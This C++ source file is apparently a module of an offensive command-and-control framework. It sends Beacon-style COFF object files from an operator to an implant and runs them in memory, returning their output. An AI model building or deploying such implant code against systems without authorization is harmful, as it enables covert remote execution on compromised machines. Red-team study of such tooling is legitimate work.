#include "CoffLoader.hpp"

#include <cstring>
#include <array>
#include <filesystem>

#ifdef _WIN32
#include <windows.h>
#endif

#include "CoffPacker.hpp"
#include "Common.hpp"

extern "C" 
{
#include "COFFLoader.h"
#ifdef _WIN32
#include "beacon_compatibility.h"
#endif
}

using namespace std;


constexpr std::string_view moduleName = "coffLoader";
constexpr unsigned long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) CoffLoader* A_CoffLoaderConstructor() 
{
    return new CoffLoader();
}

#else

__attribute__((visibility("default"))) CoffLoader* CoffConstructor() 
{
    return new CoffLoader();
}

#endif

CoffLoader::CoffLoader()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
}

CoffLoader::~CoffLoader()
{
}

std::string CoffLoader::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "coffLoader:\n";
	info += "Load a .o coff file and execute it.\n";
    info += "Coff take packed argument as entry, you get to specify the type as a string of [Z,z,s,i] for wstring, string, short, int.\n";
	info += "exemple:\n";
	info += "- coffLoader ./dir.x64.o go Zs c:\\ 0\n";
    info += "- coffLoader ./whoami.x64.o\n";
#endif
	return info;
}

int CoffLoader::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
    if (splitedCmd.size() < 3)
    {
		c2Message.set_returnvalue(getInfo());
		return -1;
    }

    c2Message.set_instruction(splitedCmd[0]);

    c2Message.set_cmd(splitedCmd[2]);
    if (splitedCmd.size() > 3)
    {
        string arg;
        for (int idx = 3; idx < splitedCmd.size(); idx++) 
        {
            if(!arg.empty())
                arg+=" ";
            arg+=splitedCmd[idx];
        }

        // make a check

        c2Message.set_args(arg);
    }
    else
        c2Message.set_args("");

    string inputFile = splitedCmd[1];
    std::ifstream input(inputFile, std::ios::binary);
    if (input.is_open()) 
    {
        std::string payload(std::istreambuf_iterator<char>(input), {});

        c2Message.set_instruction(splitedCmd[0]);

        c2Message.set_inputfile(inputFile);
        c2Message.set_data(payload.data(), payload.size());
    }
    else 
    {
        std::string msg = "Couldn't open file.\n";
        c2Message.set_returnvalue(msg);
        return -1;
    }


	return 0;
}


int CoffLoader::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	std::string payload = c2Message.data();
    std::string functionName = c2Message.cmd();
    std::string args = c2Message.args();

	std::string result = coffLoader(payload, functionName, args);

	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_returnvalue(result);

	return 0;
}


std::string CoffLoader::coffLoader(std::string& payload, std::string& functionName, std::string& args)
{
    std::string result;

    char* coff_data = payload.data();
    uint32_t filesize = payload.size();
    char* functionname = functionName.data();

    // Pack arguments, done on the windows box to get the formating right
    std::string argsCompressed;
    if(!args.empty())
    {
        std::vector<std::string> splitedList;
        splitList(args, " ", splitedList);

        std::string format = splitedList[0];   

        string argToPack;
        for (int idx = 1; idx < splitedList.size(); idx++) 
        {
            if(!argToPack.empty())
                argToPack+=" ";
            argToPack+=splitedList[idx];
        }

        CoffPacker coffPacker;
        int res = coffPacker.process(argToPack, format, argsCompressed);
        if(res!=0)
        {
            result += "Failed to pack th arguments.\n";
            return result;
        }
    }

    int argumentSize = 0;
    unsigned char* arguments = unhexlify((unsigned char*)argsCompressed.data(), &argumentSize);

    int checkcode = RunCOFF(functionname, (unsigned char*)coff_data, filesize, arguments, argumentSize);
    if (checkcode == 0) 
    {
#ifdef _WIN32

        char* outdata = NULL;
        int outdataSize = 0;

        outdata = BeaconGetOutputData(&outdataSize);
        if (outdata != NULL) 
        {
            result += outdata;
        }
#endif
    }
    else 
    {
        result += "Failed to run/parse the COFF file\n";
    }


	return result;
}